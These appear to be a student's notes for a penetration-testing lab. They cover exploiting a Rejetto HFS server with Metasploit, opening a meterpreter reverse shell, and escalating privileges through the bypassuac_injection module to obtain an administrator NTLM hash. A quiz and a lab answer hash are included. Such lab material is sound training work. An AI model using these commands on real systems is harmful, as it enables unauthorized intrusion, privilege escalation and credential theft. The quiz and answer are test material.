- User Access Control
- Prevents unauthorized changes to an OS
- Ensures Admin allows for the change
- We can remove the UAC flag for a shell, even though we aren't Administrator


Setup msfconsole
```
service postgresql start && msfconsole 
workspace -a uac
setg RHOST <target_ip>
setg LHOST <local_ip>
```

Scan and Enumerate target
```
db_nmap -sV -O <target_ip>
```

Setup exploit module 
```
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set payload windows/x64/meterpreter/reverse_tcp
options
```

To get system information in meterpreter, upgrade to Administrator or turn off UAC

Get users 
```
shell
net users
```

Setup bypass uac module
```
search bypassuac_injection
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
options
set SESSION <session_id>
set LPORT <port_of_meterpreter_session>
set TARGET <arch_of_target_system>
exploit
```


## Quiz

What does UAC stand for?

	User Account Control

Which one of the following Windows commands can be used to enumerate members of the "Administrators" group?

	net localgroup administrators
## Lab

A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

Then, bypass [[UAC](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)using the [Memory Injection](https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_injection/) Metasploit local exploit module. 

Objective: Gain the highest privilege on the compromised machine and get administrator user NTLM hash.

Instructions:

- Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
- The IP address of the target machine is mentioned in the file “/root/Desktop/target”
- Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1


```
Local IP: 10.10.80.2
Remote IP: 10.4.30.96
```

```
db_nmap -sV -O 10.4.30.96

services
```

```
f168d9f8e6c5b893b8c4dfa202228235
```